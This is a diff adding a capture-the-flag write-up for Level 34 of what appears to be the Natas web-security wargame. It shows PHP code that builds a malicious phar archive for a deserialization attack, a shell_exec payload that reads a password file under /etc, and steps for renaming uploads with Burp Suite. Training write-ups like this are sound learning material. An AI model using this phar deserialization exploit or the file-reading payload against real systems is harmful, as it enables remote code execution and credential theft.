@@ -963,3 +963,82 @@ which is
 to get the password
 
 ![alt text](NatasScreenshots/33.3.png)
+
+# Level 34
+
+This level wasn't easy at all and it required some deep research to solve.  The logic behind the web is uploading a file and storing it somewhere in the server, then it does a check for the **md5** hash of the uploaded file and if it passes the check, its content gets executed with php compiler. So if we pass that hash check, we can literally execute any php code we want. The hash is being compared to string that is hardcoded from the beginning in the class **Executer**. Obviously, we need to override it. And this reminded me of how we changed a variable in a class in **level 26** using **PHP Object Injection** attack. But There is no desirialization call in the flow of the code. But let's keep that in mind. 
+
+In an attempt to bypass the **md5_file()** function, I search for known vulnerabilities and I found out that applying that function on a **phar** file, the objects saved in its metadata get **unserilized**. I was like : Repeate that again ?
+
+So I went looking for this **phar** thing. It seems like its an archive file similar to JAR in java and its has specific structure. Among this structure, this file holds reference to some other files and also something called metadata that can store objects and these objects get unserialized whenever this phar file gets passed in a file managment function like opening or something similar. I'm not so sure if I got the way it works right but I understood what I need to solve this level. We need a file that contains the php payload to be executed eventually, and a phar file that points to that payload file and that holds in its metadata an object from tha class **Executor** but with values we desire.
+
+
+First, let's craft this **phar** file. Ir is done by creating a php file that creates the phar file. Let's name this file **"phar_creation.php"**
+
+```php
+<?php
+    
+    // modified Executor Class
+    class Executor{
+        private $filename="attack.php"; 
+        private $signature=True;
+        private $init=False;
+    }
+
+    // Object instantiaition
+    $executor = new Executor();
+
+    // phar file name declararion
+    $pharFile = 'phar_file.phar';
+
+    // clean up for existing phar file
+    if (file_exists($pharFile)) 
+    {
+        unlink($pharFile);
+    }
+
+    // create phar
+    $phar = new Phar($pharFile);
+
+    // start buffering. Mandatory to modify stub which is something required
+    $phar->startBuffering();
+
+    // Add the stub; teh way found online without changing it
+    $phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+    //empty text file just to fill the content of the archive 
+    $phar->addFromString('empty.txt', 'text');
+
+    // save the executor object to the metadata
+    $phar->setMetadata($executor);
+
+    // stop writing on the phar
+    $phar->stopBuffering();
+```
+
+Now let's execute this file with the command :
+
+```console
+$ php --define phar.readonly=0 phar_creation.php
+```
+
+Now, let's hope to **Burp Suite** and intercept the submission of the file to change it's name from our **PHPSESSID** to it's intented name to be used later.
+
+![alt text](NatasScreenshots/34.2.png)
+
+Now, let's create the **attack.php** file that contains our payload and will be called in the **passthru()** function.
+
+```php
+<?php echo shell_exec('cat /etc/natas_webpass/natas34'); ?>
+```
+
+and let's save it in the server by uploading it and keeping its name with **Burp Suite**.
+
+![alt text](NatasScreenshots/34.3.png)
+
+Now, let's to the upload one more time. But this, we will change the name of the file to **"phar://phar_file.phar"** which is the wrapper that will let us execute the desirialization of the phar file we uploaded earlier in the server.
+
+![alt text](NatasScreenshots/34.4.png).
+
+NICE !
+
